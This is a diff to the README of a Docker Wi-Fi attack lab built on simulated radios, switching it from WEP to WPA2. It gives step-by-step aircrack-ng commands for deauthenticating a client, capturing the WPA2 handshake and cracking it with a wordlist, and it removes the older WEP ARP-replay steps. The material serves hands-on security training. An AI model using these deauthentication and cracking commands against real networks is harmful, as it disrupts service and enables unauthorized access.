@@ -1,11 +1,11 @@
-# WEP Lab — Docker Setup
+# WPA2 Lab — Docker Setup
 
 ## Architecture
 
 ```
 Host Kernel (mac80211_hwsim)
-  ├── wlan0  →  Container A (ap)      — hostapd running WEP AP (SSID: wifi-old)
-  ├── wlan1  →  Container B (client)  — wpa_supplicant connected to wifi-old
+  ├── wlan0  →  Container A (ap)      — hostapd running WPA2 AP (SSID: wifi-lab)
+  ├── wlan1  →  Container B (client)  — wpa_supplicant connected to wifi-lab
   └── wlan2  →  HOST / Kali           — your attack interface
 ```
 
@@ -30,7 +30,6 @@ modinfo mac80211_hwsim   # should print module info
 ## Start the lab
 
 ```bash
-cd wep-lab
 docker compose up --build
 ```
 
@@ -55,7 +54,7 @@ sudo airmon-ng start wlan2
 ### 2. Scan — confirm the AP is visible
 ```bash
 sudo airodump-ng wlan2mon
-# Look for SSID: wifi-old, Channel: 6, Encryption: WEP
+# Look for SSID: wifi-lab, Channel: 6, Encryption: WPA2
 # Note the BSSID (AP MAC) and the CLIENT MAC
 ```
 
@@ -65,39 +64,24 @@ sudo airodump-ng -c 6 --bssid <AP_BSSID> -w capture wlan2mon
 # Keep this running in a terminal
 ```
 
-### 4. Accelerate IVs — ARP replay attack
+### 4. Deauthenticate the client
 ```bash
-sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <CLIENT_MAC> wlan2mon
-# This replays ARP packets to generate thousands of IVs fast
+sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan2mon
+# This will deauthenticate the client. Make sure that after the deauthentication, the airodump capture the WPA2 handshake
 ```
 
-### 5. Crack the key
+### 5. Crack the handshake
 ```bash
-# Once you have ~5000+ IVs (watch the airodump #Data counter):
-sudo aircrack-ng -b <AP_BSSID> capture*.cap
+sudo aircrack-ng <CAPTURE_FILE>.cap -w /usr/share/wordlists/rockyou.txt
 
 # Expected output:
-# KEY FOUND! [ AA:BB:CC:DD:EE ]
+# KEY FOUND! [ cookie123 ]
 ```
 
 ---
 
-## WEP key in this lab
+## WPA2 key in this lab
 
-The key is: `AABBCCDDEE` (hex 40-bit / 5-byte)
+The key is: `cookie123`
 
 ---
-
-## Troubleshooting
-
-**`wep_default_key` unknown in hostapd logs**
-→ Stock hostapd 2.10+ drops WEP. The Dockerfile builds from source with `CONFIG_WEP=y`. Rebuild: `docker compose build --no-cache ap`
-
-**`wlan2` not visible on host**
-→ Check `iw dev` after the AP container starts. If missing: `modprobe mac80211_hwsim radios=3` manually.
-
-**Client not associating**
-→ Check client logs: `docker logs wep-client`. Confirm AP is up first.
-
-**aircrack says "not enough IVs"**
-→ Let aireplay-ng run longer. WEP 40-bit cracks in ~5k-20k IVs, 104-bit needs ~100k+.
